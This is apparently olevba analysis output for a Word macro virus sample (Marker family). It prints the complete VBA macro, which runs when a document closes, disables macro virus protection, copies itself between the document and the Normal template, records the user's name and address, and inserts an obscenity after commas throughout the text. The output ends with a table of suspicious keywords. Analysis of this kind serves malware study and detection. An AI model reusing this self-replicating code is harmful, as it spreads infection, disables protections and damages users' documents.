olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hp-f5dc2d2ebab65711e2ebe5358e17d9bc8677a27a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hp-f5dc2d2ebab65711e2ebe5358e17d9bc8677a27a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








' АНТИ-ТЕЛЕПУЗИК
'
'





Private Sub Document_Close()
   On Error Resume Next
   Dim vir, dot As Object
   Dim s As String
   Dim viris, dotis As Boolean
   Set vir = ActiveDocument.VBProject.VBComponents.Item(1)
   Set dot = NormalTemplate.VBProject.VBComponents.Item(1)
   viris = False
   dotis = False
   If vir.CodeModule.CountOfLines <> 0 Then viris = True
   If dot.CodeModule.CountOfLines <> 0 Then dotis = True
   If (viris = True Xor dotis = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If viris = True Then
            Options.VirusProtection = False
            s = vir.CodeModule.Lines(1, vir.CodeModule.CountOfLines)
            dot.CodeModule.InsertLines 1, s
            If NormalTemplate.Saved = True Then NormalTemplate.Save
        End If
        If dotis = True Then
            s = dot.CodeModule.Lines(1, dot.CodeModule.CountOfLines)
            s = s & Chr(13) & Chr(13) & "' " & Application.UserName & "@" & Application.UserAddress & Format(Time, " hh:mm:ss - ") & Format(Date, "dddd, d mmm yyyy")
            vir.CodeModule.InsertLines 1, s
            If ActiveDocument.Saved = True Then ActiveDocument.Save
        End If
   End If
   
   Randomize (666)
   'If Round(Rnd * 50) = 13 Then MsgBox "Я НЕНАВИЖУ ТЕЛЕПУЗИКОВ!!!", vbExclamation
   'If Round(Rnd * 13) = 3 Then
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = ", "
        .Replacement.Text = ", бля, "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
   'End If
End Sub



' Dmitrij@ 14:20:46 - среда, 20 июн 2001

' ‘Ґа¦@ 17:29:01 - понедельник, 2 июл 2001

' fayer@aku@tanak-cakap.com 18:13:43 - пятница, 25 май 2001
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
